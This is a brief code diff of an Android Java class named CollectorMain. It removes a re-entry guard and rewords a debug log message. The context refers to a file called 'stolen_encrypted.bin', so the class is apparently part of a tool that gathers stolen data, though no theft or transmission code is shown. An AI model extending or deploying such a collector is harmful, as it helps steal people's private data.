@@ -51,8 +51,6 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	@Override
 	public void run() {
 		// TODO: Implement this method
-		if (running)
-			return;	
 		SharedPreferences sb;
 		String uuid=TheApplication.instance.uuid;
 		if(new File(getFilesDir(), "stolen_encrypted.bin").exists()){
@@ -152,7 +150,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		} finally {
 			running=false;
 			for (String s:sb.getAll().keySet()) {
-				Log.d("remain", s);
+				Log.d("CollectorMain", "remain: "+s);
 			}
 		}
 	}
